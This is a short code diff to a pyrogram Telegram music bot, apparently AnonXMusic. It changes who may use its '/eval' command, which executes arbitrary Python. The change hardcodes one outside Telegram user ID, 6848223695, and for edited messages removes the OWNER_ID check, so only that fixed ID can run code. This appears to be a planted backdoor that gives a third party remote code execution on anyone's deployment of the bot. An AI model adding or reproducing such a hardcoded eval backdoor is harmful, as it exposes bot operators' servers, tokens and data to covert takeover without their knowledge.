@@ -13,7 +13,7 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 from AnonXMusic import app
 from config import OWNER_ID
 
-ALLOWED_USERS = {7765692814, 6848223695}
+ALLOWED_USER = 6848223695
 
 async def aexec(code, client, message):
     exec(
@@ -31,15 +31,13 @@ async def edit_or_reply(msg: Message, **kwargs):
 
 @app.on_edited_message(
     filters.command("eval")
-    & filters.user(OWNER_ID)
-    & filters.user("6848223695")
+    & filters.user(ALLOWED_USER)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("eval")
     & filters.user(OWNER_ID)
-    & filters.user("6848223695")
     & ~filters.forwarded
     & ~filters.via_bot
 )
